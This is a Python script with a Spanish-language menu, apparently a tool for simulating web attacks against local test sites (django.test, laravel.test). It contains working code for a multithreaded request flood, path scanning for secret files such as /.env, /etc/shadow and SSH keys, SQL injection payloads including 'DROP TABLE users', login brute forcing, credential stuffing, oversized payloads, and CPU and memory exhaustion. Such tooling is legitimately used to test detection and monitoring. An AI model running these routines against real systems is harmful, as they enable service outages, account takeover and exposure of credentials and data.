#!/usr/bin/env python3

import requests
import threading
import time
import random
import string
import sys

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

BASE_URL_DJANGO = "http://django.test"
BASE_URL_LARAVEL = "http://laravel.test"

def menu():
    print("\n" + Fore.CYAN + "="*50)
    print(Fore.CYAN + "   SIMULADOR DE ATAQUES - HERRAMIENTA DE PRUEBAS")
    print(Fore.CYAN + "="*50)
    print(Fore.RED    + "1.  " + Fore.WHITE + "DoS - Muchas conexiones desde una IP")
    print(Fore.RED    + "2.  " + Fore.WHITE + "Scraping - Alto número de requests por endpoint")
    print(Fore.YELLOW + "3.  " + Fore.WHITE + "Escaneo de rutas (errores 4xx)")
    print(Fore.YELLOW + "4.  " + Fore.WHITE + "Fuerza bruta (401/403)")
    print(Fore.YELLOW + "5.  " + Fore.WHITE + "Acceso a archivos sensibles")
    print(Fore.YELLOW + "6.  " + Fore.WHITE + "Inyección SQL en URLs")
    print(Fore.MAGENTA+ "7.  " + Fore.WHITE + "Fuerza bruta en login de Laravel")
    print(Fore.MAGENTA+ "8.  " + Fore.WHITE + "Credential stuffing")
    print(Fore.BLUE   + "9.  " + Fore.WHITE + "Reconocimiento (OPTIONS y HEAD)")
    print(Fore.BLUE   + "10. " + Fore.WHITE + "Buffer overflow (payloads grandes)")
    print(Fore.GREEN  + "11. " + Fore.WHITE + "Alto uso de CPU")
    print(Fore.GREEN  + "12. " + Fore.WHITE + "Alto uso de RAM")
    print(Fore.WHITE  + "0.  " + Fore.WHITE + "Salir")
    print(Fore.CYAN + "="*50)
    return input(Fore.CYAN + "Selecciona una opción: " + Fore.WHITE).strip()

def header(title, color=Fore.RED):
    print(f"\n{color}{'='*50}")
    print(f"{color}  {title}")
    print(f"{color}{'='*50}{Style.RESET_ALL}")

def ok(msg):
    print(Fore.GREEN + "  ✔ " + Fore.WHITE + msg)

def info(msg):
    print(Fore.CYAN + "  ℹ " + Fore.WHITE + msg)

def warn(msg):
    print(Fore.YELLOW + "  ⚠ " + Fore.WHITE + msg)

def err(msg):
    print(Fore.RED + "  ✘ " + Fore.WHITE + msg)

# 1. DoS
def dos_attack():
    header("DoS - Muchas conexiones desde una IP")
    info("Enviando 200 requests rápidas...")
    url = BASE_URL_DJANGO
    contador = {"ok": 0, "fail": 0}

    def send():
        try:
            requests.get(url, timeout=5)
            contador["ok"] += 1
        except:
            contador["fail"] += 1

    threads = []
    for _ in range(200):
        t = threading.Thread(target=send)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    ok(f"Requests enviadas: {contador['ok']}")
    if contador["fail"]:
        warn(f"Requests fallidas: {contador['fail']}")
    ok("DoS completado.")

# 2. Scraping
def scraping_attack():
    header("Scraping - Alto número de requests por endpoint", Fore.RED)
    endpoints = [
        "/api/producto/",
        "/api/producto/1/",
        "/api/producto/2/",
        "/api/producto/3/",
    ]
    info("Raspando endpoints repetidamente...")
    total = 0
    for _ in range(50):
        for ep in endpoints:
            try:
                r = requests.get(BASE_URL_DJANGO + ep, timeout=5)
                total += 1
            except:
                pass
    ok(f"Total requests enviadas: {total}")
    ok("Scraping completado.")

# 3. Escaneo de rutas
def route_scan():
    header("Escaneo de rutas (errores 4xx)", Fore.YELLOW)
    rutas = [
        "/admin", "/admin/login", "/wp-login.php", "/wp-admin",
        "/.env", "/.git/config", "/config.php", "/backup.zip",
        "/phpmyadmin", "/adminer", "/shell.php", "/cmd.php",
        "/api/users", "/api/admin", "/dashboard", "/secret",
    ]
    info("Probando rutas inexistentes...")
    for ruta in rutas:
        for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
            try:
                r = requests.get(base + ruta, timeout=5)
                color = Fore.GREEN if r.status_code < 400 else Fore.RED
                print(f"  {color}{base}{ruta} → {r.status_code}{Style.RESET_ALL}")
            except Exception as e:
                err(f"{base}{ruta} → {e}")
    ok("Escaneo completado.")

# 4. Fuerza bruta 401/403
def brute_force_auth():
    header("Fuerza bruta (401/403)", Fore.YELLOW)
    endpoints = ["/api/admin", "/api/users", "/dashboard", "/admin"]
    info("Probando endpoints protegidos...")
    for _ in range(30):
        for ep in endpoints:
            for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
                try:
                    requests.get(base + ep, timeout=5)
                except:
                    pass
    ok("Fuerza bruta completada.")

# 5. Archivos sensibles
def sensitive_files():
    header("Acceso a archivos sensibles", Fore.YELLOW)
    rutas = [
        "/.env", "/.env.local", "/.env.production",
        "/.git/config", "/.git/HEAD",
        "/config/database.yml", "/config/secrets.yml",
        "/storage/logs/laravel.log",
        "/wp-config.php", "/configuration.php",
        "/etc/passwd", "/etc/shadow",
        "/id_rsa", "/.ssh/id_rsa",
    ]
    info("Accediendo a rutas sensibles...")
    for ruta in rutas:
        for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
            try:
                r = requests.get(base + ruta, timeout=5)
                color = Fore.GREEN if r.status_code < 400 else Fore.RED
                print(f"  {color}{base}{ruta} → {r.status_code}{Style.RESET_ALL}")
            except Exception as e:
                err(f"{base}{ruta} → {e}")
    ok("Acceso a archivos sensibles completado.")

# 6. Inyección SQL
def sql_injection():
    header("Inyección SQL en URLs", Fore.YELLOW)
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1; DROP TABLE users--",
        "1 UNION SELECT * FROM users--",
        "' OR 1=1--",
        "admin'--",
        "1' AND SLEEP(5)--",
        "' OR 'x'='x",
    ]
    info("Enviando payloads en URLs...")
    for payload in payloads:
        for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
            try:
                r = requests.get(f"{base}/api/producto/{payload}/", timeout=5)
                color = Fore.GREEN if r.status_code < 400 else Fore.RED
                print(f"  {color}payload={payload!r} → {r.status_code}{Style.RESET_ALL}")
            except Exception as e:
                err(f"payload={payload!r} → {e}")
    ok("Inyección SQL completada.")

# 7. Fuerza bruta login Laravel
def laravel_login_brute():
    header("Fuerza bruta en login de Laravel", Fore.MAGENTA)
    url = BASE_URL_LARAVEL + "/login"
    passwords = ["123456", "password", "admin", "secret", "laravel",
                 "qwerty", "abc123", "letmein", "monkey", "master"]
    info(f"Atacando {url}...")
    for pwd in passwords * 5:
        try:
            r = requests.post(url, data={
                "email": "admin@test.com",
                "password": pwd,
                "_token": "fake_token"
            }, timeout=5)
            print(f"  {Fore.CYAN}pwd={pwd!r} → {r.status_code}{Style.RESET_ALL}")
        except Exception as e:
            err(f"pwd={pwd!r} → {e}")
    ok("Fuerza bruta en login completada.")

# 8. Credential stuffing
def credential_stuffing():
    header("Credential Stuffing", Fore.MAGENTA)
    credentials = [
        ("user1@gmail.com", "Password1"),
        ("admin@yahoo.com", "Admin123"),
        ("test@hotmail.com", "Test1234"),
        ("john@gmail.com", "John2020"),
        ("maria@test.com", "Maria123"),
        ("carlos@gmail.com", "Carlos99"),
        ("ana@test.com", "Ana12345"),
        ("pedro@gmail.com", "Pedro000"),
    ]
    url = BASE_URL_LARAVEL + "/login"
    info(f"Probando credenciales filtradas en {url}...")
    for email, pwd in credentials * 3:
        try:
            r = requests.post(url, data={
                "email": email,
                "password": pwd,
                "_token": "fake_token"
            }, timeout=5)
            print(f"  {Fore.CYAN}{email}:{pwd} → {r.status_code}{Style.RESET_ALL}")
        except Exception as e:
            err(f"{email} → {e}")
    ok("Credential stuffing completado.")

# 9. Reconocimiento OPTIONS/HEAD
def reconnaissance():
    header("Reconocimiento (OPTIONS y HEAD)", Fore.BLUE)
    endpoints = [
        "/", "/api/", "/api/producto/",
        "/admin", "/login", "/dashboard",
    ]
    info("Enviando OPTIONS y HEAD requests...")
    for ep in endpoints:
        for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
            try:
                r_opt = requests.options(base + ep, timeout=5)
                r_head = requests.head(base + ep, timeout=5)
                print(f"  {Fore.BLUE}OPTIONS {base}{ep} → {r_opt.status_code}{Style.RESET_ALL}")
                print(f"  {Fore.BLUE}HEAD    {base}{ep} → {r_head.status_code}{Style.RESET_ALL}")
            except Exception as e:
                err(f"{base}{ep} → {e}")
    ok("Reconocimiento completado.")

# 10. Buffer overflow
def buffer_overflow():
    header("Buffer Overflow (payloads grandes)", Fore.BLUE)
    payload_grande = "A" * 10000
    payload_header = "X" * 8000
    info("Enviando payloads enormes...")
    for base in [BASE_URL_DJANGO, BASE_URL_LARAVEL]:
        try:
            requests.get(f"{base}/?q={payload_grande}", timeout=5)
            requests.post(f"{base}/api/producto/", data={"data": payload_grande}, timeout=5)
            requests.get(base, headers={"X-Custom": payload_header}, timeout=5)
            ok(f"{base} → payloads enviados")
        except Exception as e:
            err(f"{base} → {e}")
    ok("Buffer overflow completado.")

# 11. Alto CPU
def high_cpu():
    header("Alto uso de CPU", Fore.GREEN)
    info("Generando carga de CPU por 30 segundos...")
    warn("Presiona Ctrl+C para detener antes.")

    def burn_cpu():
        end = time.time() + 30
        while time.time() < end:
            _ = [x**2 for x in range(10000)]

    threads = []
    for _ in range(4):
        t = threading.Thread(target=burn_cpu)
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        warn("Detenido por el usuario.")

    ok("Alto CPU completado.")


# 12. Alto RAM (Versión Persistente)
def high_ram():
    header("Alto uso de RAM", Fore.GREEN)
    bloque_size = 100 * 1024 * 1024  # Bloques de 100MB
    # Preguntamos cuánto tiempo queremos mantener la carga
    try:
        segundos = int(input(Fore.CYAN + " ¿Cuántos segundos quieres mantener la RAM ocupada? (ej. 60): " + Fore.WHITE))
    except:
        segundos = 60

    info(f"Consumiendo memoria. Se mantendrá por {segundos}s...")
    
    bloques = []
    try:
        # Llenamos la RAM (ajusta el rango si tienes mucha RAM, ej. range(40) para 4GB)
        for i in range(25): 
            bloques.append(" " * bloque_size)
            total_actual = (i + 1) * 100
            print(f"  {Fore.GREEN}→{Fore.WHITE} RAM ocupada: {total_actual}MB", end="\r")
            time.sleep(0.1)
        
        print("\n")
        ok(f"Carga completa. Manteniendo durante {segundos} segundos...")
        
        # El truco: un contador visual mientras la memoria sigue llena
        for restante in range(segundos, 0, -1):
            print(f"  {Fore.YELLOW}ℹ{Fore.WHITE} Liberando en: {restante}s  ", end="\r")
            time.sleep(1)
            
    except KeyboardInterrupt:
        warn("\nInterrupción manual detectada.")
    except MemoryError:
        err("\n¡MemoryError! El servidor se quedó sin RAM.")
    finally:
        bloques.clear() # Aquí es donde realmente se libera
        print("\n")
        ok("Memoria liberada correctamente.")

# Main
def main():
    acciones = {
        "1": dos_attack,
        "2": scraping_attack,
        "3": route_scan,
        "4": brute_force_auth,
        "5": sensitive_files,
        "6": sql_injection,
        "7": laravel_login_brute,
        "8": credential_stuffing,
        "9": reconnaissance,
        "10": buffer_overflow,
        "11": high_cpu,
        "12": high_ram,
    }

    while True:
        opcion = menu()
        if opcion == "0":
            print(Fore.CYAN + "\nSaliendo..." + Style.RESET_ALL)
            sys.exit(0)
        elif opcion in acciones:
            acciones[opcion]()
        else:
            warn("Opción no válida.")

if __name__ == "__main__":
    main()
